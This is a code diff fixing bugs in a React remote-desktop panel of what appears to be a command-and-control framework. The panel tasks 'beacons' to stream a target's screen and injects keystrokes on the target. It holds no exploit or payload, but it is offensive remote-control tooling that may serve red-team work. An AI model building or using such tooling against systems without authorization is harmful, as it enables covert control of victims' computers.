@@ -1,5 +1,6 @@
 import { useCallback, useEffect, useRef, useState } from 'react'
 import { useSerialPoll } from '@/hooks/useSerialPoll'
+import { apiError } from '@/hooks/useApi'
 import { Monitor, MousePointer2, Play, Square, Zap, Camera } from 'lucide-react'
 import type { Beacon } from '@/store'
 
@@ -43,21 +44,31 @@ export default function RemoteCanvas({ beacon, api }: Props) {
   const thumbs = useRef<Map<string, string>>(new Map())
 
   // ── stream controls ──────────────────────────────────────────────────────
-  const queue = useCallback(async (command: string) => {
-    await api('POST', `/api/c2/beacon/${beacon.id}/task`, { command })
-  }, [api, beacon.id])
+  const queue = useCallback(
+    (command: string) => api('POST', `/api/c2/beacon/${beacon.id}/task`, { command }),
+    [api, beacon.id])
 
   const startStream = async (live: boolean) => {
     setErr('')
+    // `requestApi` NEVER throws: it always resolves to a structured
+    // `{status, data}` (status 0 on an IPC error/timeout). `queue` used to
+    // `await` without returning, so the old `res !== undefined` was tested
+    // on `undefined` and streaming never engaged; now the response is
+    // returned and gated on the REAL status (a 403/500 must not look live).
     const res = await queue(live ? 'remote live' : 'remote start')
-    if (res !== undefined) {
+    if (res && res.status === 200) {
       setStreaming(true)
       setLiveMode(live)
+    } else {
+      setStreaming(false)
+      setLiveMode(false)
+      setErr(apiError(res))
     }
   }
 
   const stopStream = async () => {
-    await queue('remote stop')
+    const res = await queue('remote stop')
+    if (!res || res.status !== 200) setErr(apiError(res))
     setStreaming(false)
     setLiveMode(false)
   }
@@ -138,11 +149,22 @@ export default function RemoteCanvas({ beacon, api }: Props) {
   }
 
   const onTypeKey = (e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Enter') { sendInput('key ENTER'); return }
+    // Single input model: the text is buffered LOCALLY and sent ONCE. The
+    // module's `type <text>` writes the whole string, so sending the growing
+    // buffer on every keypress duplicated it on the target ("a"+"ab"+"abc").
+    if (e.key === 'Enter') {
+      if (typeText) { sendInput(`type ${typeText}`); setTypeText('') }
+      sendInput('key ENTER')
+      return
+    }
     if (e.key === 'Escape') { sendInput('key ESC'); return }
     if (e.key === 'Tab') { sendInput('key TAB'); return }
+    if (e.key === 'Backspace') {
+      e.preventDefault()
+      setTypeText((t) => t.slice(0, -1))
+      return
+    }
     if (e.key.length === 1) {
-      sendInput(`type ${typeText + e.key}`)
       e.preventDefault()
       setTypeText((t) => t + e.key)
     }
